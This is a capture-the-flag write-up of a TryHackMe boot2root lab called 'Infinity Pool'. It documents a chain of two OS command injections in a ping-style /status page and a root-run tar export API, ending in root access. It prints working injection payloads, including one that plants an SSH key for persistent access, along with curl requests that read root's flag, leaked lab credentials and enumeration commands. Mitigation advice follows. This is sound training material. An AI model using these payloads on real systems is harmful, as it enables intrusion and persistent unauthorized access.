# Challenge 11: Infinity Pool

## 1. Challenge Information

| Field | Value |
|---|---|
| **Platform** | TryHackMe |
| **Event** | Hacker Holidays 2026 |
| **Category** | Boot2Root |
| **Difficulty** | Medium |
| **Vulnerability Type** | OS Command Injection (Multi-stage: Initial Access → Privilege Escalation) |

**Objective:**
Compromise the target machine (Byte Lotus Hotel - internal automation infrastructure) end-to-end: gain an initial foothold, retrieve the user flag, escalate privileges to root, and retrieve the root flag.

---

## 2. Understanding the Challenge (Recon / Analysis)

### What did I notice?
The briefing hinted that "the most interesting systems are the ones guests were never meant to see" — suggesting the target hosts internal services not meant to be reachable directly, and that reaching them would require pivoting through an initial foothold.

### What services were open?
Initial reconnaissance on the target (`10.49.136.113`) revealed a web application as the entry point. While inspecting the front-end JavaScript file `/static/app.js`, I found a comment referencing an internal `/status` endpoint that wasn't linked anywhere in the visible UI.

![Challenge 11](../Screenshots/Challenge11/infinity1.png)

Browsing to `/status` revealed a diagnostics-style interface that accepted a host/IP as input — the classic shape of a "ping" utility.

![Challenge 11](../Screenshots/Challenge11/infinity2.png)

### What tools did I use?
- Browser / view-source for front-end inspection.
- `curl` for probing internal HTTP services.
- `ssh-keygen` / `base64` for planting an SSH key for persistent access.
- `ssh` (including local port forwarding) for interactive access and pivoting.
- Standard Linux enumeration commands (`id`, `sudo -l`, `find`, `getcap`, `ps`, `ss`, `systemctl`) for privilege-escalation recon.

### Why did I move to the next step?
The `/status` host-input field looked like it was passed straight into a shell command (a common pattern for "ping" style diagnostics tools), so the natural next step was to test it for OS command injection.

---

## 3. Root Cause

This challenge chains **two separate instances of the same root cause**: unsanitized user input passed directly into a shell command (OS Command Injection).

- **Stage 1 (Initial Access):** The `/status` endpoint took a host value and inserted it directly into a system command (likely `ping <host>`) without validation or sanitization, allowing shell metacharacters (`;`, `$()`) to inject arbitrary commands.
- **Stage 2 (Privilege Escalation):** An internal automation service running as **root** exposed a `POST /jobs/export` endpoint that took a `report` value and inserted it directly into a `tar` command (`tar czf /var/automation/exports/<report>.tgz /var/automation/data`) without sanitization — again allowing arbitrary command execution, this time as root.

In both cases, the applications trusted user-supplied input to be "just a hostname" or "just a report name," when in fact it was concatenated straight into a shell command string.

---

## 4. How It Was Discovered

### How did I know the vulnerability existed?
The `/status` field accepting a raw host value was the first red flag. For the second stage, querying the automation service's `/health` endpoint returned a self-documenting API description that explicitly showed the expected request shape for `/jobs/export`, hinting that the `report` field would end up somewhere on the filesystem (i.e., likely inside a shell command).

### What tests did I run?

**Stage 1 - testing the `/status` field:**
```
127.0.0.1$(id)
127.0.0.1;id
127.0.0.1;id;#
```

**Stage 2 - testing the automation service:**
First, a legitimate request was sent to observe normal behavior:
```
curl -sS \
    -X POST \
    http://127.0.0.1:9000/jobs/export \
    -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
    -H 'Content-Type: application/json' \
    --data-binary '{"report":"latest"}'
```

Response:
```json
{"command":"tar czf /var/automation/exports/latest.tgz /var/automation/data 2>&1","output":"tar: Removing leading `/' from member names\n"}
```

### What indicators appeared?
The response literally echoed back the shell command it constructed:
```
tar czf /var/automation/exports/<report>.tgz /var/automation/data 2>&1
```
Since `<report>` was inserted directly into that command string, it was clearly command-injectable. This was confirmed with:
```
{"report":"test;id;#"}
```

---

## 5. Exploitation

### Stage 1 - Initial Foothold (User Flag)

**Step 1 - Confirm command injection on `/status`**
```
127.0.0.1$(id)
127.0.0.1;id
127.0.0.1;id;#
```

**Step 2 - Generate an SSH key pair for persistent access**
```
ssh-keygen -t rsa -b 2048 -f ./ctf_key -N ""
```

**Step 3 - Base64-encode the public key**
```
base64 -w0 ctf_key.pub
```

**Step 4 - Plant the public key as an authorized key via the injection**
```
host=127.0.0.1;mkdir -p /home/web/.ssh;echo c3NoLXJzYSBQ2MAo=|base64 -d > /home/web/.ssh/authorized_keys;chmod 700 /home/web/.ssh;chmod 600 /home/web/.ssh/authorized_keys;#
```
This created the `.ssh` directory for the `web` user, wrote the attacker's public key into `authorized_keys`, and applied the correct permissions — all through the same command injection.

**Step 5 - SSH in as the `web` user using the planted private key**
```
ssh -o IdentitiesOnly=yes -i ctf_key web@10.128.137.248
```

**Step 6 - Retrieve the user flag**
The flag's location was found by browsing the filesystem paths through the injection point, then read directly:
```
127.0.0.1;cat /home/web/user.txt
```

![Challenge 11](../Screenshots/Challenge11/infinity3.png)

**User flag:**
```
THM{*****}
```

### Stage 2 - Local Enumeration

Once shell access was obtained as `web`, standard privilege-escalation enumeration was performed:
```
id
hostname
pwd
uname -a
cat /etc/os-release
sudo -l

## SUID executables
find / -perm -4000 -type f 2>/dev/null

## Linux capabilities
getcap -r / 2>/dev/null

## Cron jobs
cat /etc/crontab
ls -la /etc/cron.d
systemctl list-timers --all --no-pager

## Running processes
ps auxww
```

This revealed a `gunicorn` process on port 3000 running as `svc-watch`, and listening ports were checked:
```
ss -lntup
```

Systemd services were then inspected:
```
ls /etc/systemd/system/
cat /etc/systemd/system/cc-automation.service
cat /etc/systemd/system/cc-watchtower.service
```

The **`cc-automation.service`** unit stood out — it ran as **root**:
```ini
[Service]
User=root
Group=root
WorkingDirectory=/var/www/infinity_pool/automation
EnvironmentFile=/var/www/infinity_pool/automation/automation.env
ExecStart=/var/www/infinity_pool/automation/venv/bin/gunicorn \
    --workers 1 \
    --bind 127.0.0.1:9000 \
    wsgi:app
```
However, the working directory itself was not directly readable:
```
drwxr-x--- root root /var/www/infinity_pool/automation
```
This meant the service had to be interacted with over HTTP rather than read from disk.

### Stage 3 - Mapping the Internal Services

**Automation service (port 9000, runs as root):**
```
curl -sS http://127.0.0.1:9000/health
```
Response:
```json
{
  "endpoints": {
    "GET /health": "service status",
    "POST /jobs/export": {
      "auth": "Authorization: Bearer <automation key>",
      "body": {
        "report": "<report name>"
      },
      "desc": "archive the latest data export"
    }
  },
  "runs_as": "root",
  "service": "automation",
  "status": "ok"
}
```
This confirmed the service ran as root and required a Bearer token to trigger the export job — the target for privilege escalation.

**Watchtower service (port 3000):**
```
curl -sS http://127.0.0.1:3000/
```
Exposed endpoints: `/api/health`, `/api/config`.

Querying `/api/config`:
```
curl -sS http://127.0.0.1:3000/api/config
```
Response:
```json
{
  "automation_endpoint": "http://127.0.0.1:9000",
  "note": "internal network only -- do not expose",
  "ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
  "telephony_pass": "St4yN0t1c3d_2026",
  "telephony_portal": "http://127.0.0.1:8080/ucp",
  "telephony_user": "FreePBXUCPTemplateCreator"
}
```
This leaked plaintext credentials for an internal FreePBX telephony portal:
```
Username: FreePBXUCPTemplateCreator
Password: St4yN0t1c3d_2026
```

![Challenge 11](../Screenshots/Challenge11/infinity4.png)

### Stage 4 - Reaching the FreePBX UCP Portal

The leaked credentials correspond to a known issue — **FreePBX hard-coded template credentials (CVE-2026-46376)** — present in:
```
/var/www/html/admin/modules/ucp/module.xml
/var/www/html/admin/modules/userman/module.xml
```

Since the FreePBX UCP portal was bound to `127.0.0.1:8080` (internal only), SSH local port forwarding was used to reach it:
```
ssh -o IdentitiesOnly=yes -i ctf_key \
  -L 8080:127.0.0.1:8080 \
  web@<target_ip>
```
Then browsing to:
```
http://127.0.0.1:8080/ucp/
```
Logging in with the leaked FreePBX template credentials led to discovering the **automation Bearer key** needed to authenticate to the root-owned automation service.

![Challenge 11](../Screenshots/Challenge11/infinity5.png)

### Stage 5 - Privilege Escalation via the Automation Service

**Send a legitimate export request to confirm behavior:**
```
curl -sS \
    -X POST \
    http://127.0.0.1:9000/jobs/export \
    -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
    -H 'Content-Type: application/json' \
    --data-binary '{"report":"latest"}'
```
Response:
```json
{"command":"tar czf /var/automation/exports/latest.tgz /var/automation/data 2>&1","output":"tar: Removing leading `/' from member names\n"}
```
The service echoed back the exact shell command it constructed, confirming that the `report` value was inserted directly into the command string.

**Confirm command injection:**
```
curl -sS \
    -X POST \
    http://127.0.0.1:9000/jobs/export \
    -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
    -H 'Content-Type: application/json' \
    --data-binary '{"report":"test;id;#"}'
```

**Retrieve the root flag:**
```
curl -sS \
    -X POST \
    http://127.0.0.1:9000/jobs/export \
    -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
    -H 'Content-Type: application/json' \
    --data-binary '{"report":"x;cat /root/root.txt;#"}'
```

### Why each command succeeded
- **`/status` injection**: succeeded because the host value was concatenated directly into a shell command without sanitization or the use of safe subprocess argument arrays.
- **SSH key planting**: succeeded because the injected commands ran with the privileges of the web service user, which was enough to write to that user's own home directory and grant persistent SSH access.
- **`/api/config` credential leak**: exposed because internal debug/config endpoints were left accessible without authentication, on the assumption that "internal network only" was sufficient protection.
- **`/jobs/export` injection**: succeeded because the `report` parameter was inserted directly into a `tar` shell command string, and because the service itself ran as **root**, any injected command executed with root privileges — directly yielding the root flag.

---

## 6. Result

- Obtained an initial foothold on the target through command injection in the `/status` diagnostics endpoint.
- Planted a persistent SSH key and gained interactive shell access as the `web` user.
- Retrieved the **user flag**:
```
THM{*****}
```
- Enumerated internal services and systemd units, identifying a root-owned automation service.
- Pivoted through a credential leak in an internal `/api/config` endpoint to access a FreePBX UCP portal via SSH port forwarding, recovering the automation service's Bearer key.
- Exploited a second command injection vulnerability in the root-owned automation service's `/jobs/export` endpoint.
- Achieved full **privilege escalation to root** and retrieved the **root flag**:
```
THM{*****}
```

---

## 7. Mitigation

- Never build shell commands by concatenating user-controlled input; use safe APIs that pass arguments as arrays (e.g. `subprocess.run([...], shell=False)`) instead of shell string interpolation.
- Validate and strictly whitelist any user-supplied value used in a system command (e.g. only allow valid IPv4/IPv6 patterns for a "host" field, and alphanumeric-only report names).
- Do not expose internal diagnostic or configuration endpoints (`/status`, `/api/config`, `/health`) without authentication, even on "internal-only" networks — defense in depth matters, since a single pivot point breaks network-segmentation assumptions.
- Never store plaintext credentials (like the FreePBX telephony password) in a config endpoint response; use a secrets manager and rotate default/template credentials immediately after deployment.
- Patch known CVEs promptly — the FreePBX hard-coded template credential issue (CVE-2026-46376) should be remediated as soon as a fix or workaround is available.
- Apply the principle of least privilege: the automation service should not run as root; it should run under a dedicated low-privilege account with only the specific permissions it needs (e.g. write access to the export directory).
- Require strong, unique authentication tokens for internal service-to-service calls, and rotate them regularly; don't rely on Bearer tokens alone if the token itself can be leaked through another vulnerable service.

---

## 8. Lessons Learned

- Learned to recognize OS command injection patterns not just in obvious "ping" utilities but also in backend services that build shell commands from user-supplied API parameters (like the `report` field in `/jobs/export`).
- Practiced a full boot2root chain: initial access → persistence (SSH key planting) → local enumeration → service mapping → credential pivoting → privilege escalation.
- Understood how seemingly low-risk internal config endpoints (`/api/config`) can leak credentials that unlock much higher-privilege access elsewhere in the environment.
- Reinforced that a single unsanitized input field, even deep inside an "internal-only" automation service, can be catastrophic if that service runs as root.
- Learned to correlate real-world CVEs (e.g. FreePBX default template credentials) with data discovered during enumeration, rather than treating every finding in isolation.

---

## 9. References

- [FreePBX Security Advisories](https://www.freepbx.org/security/)
- [OWASP - Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [MITRE CVE Database](https://www.cve.org/CVERecord?id=CVE-2026-46376)
- [National Vulnerability Database NIST NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-46376)
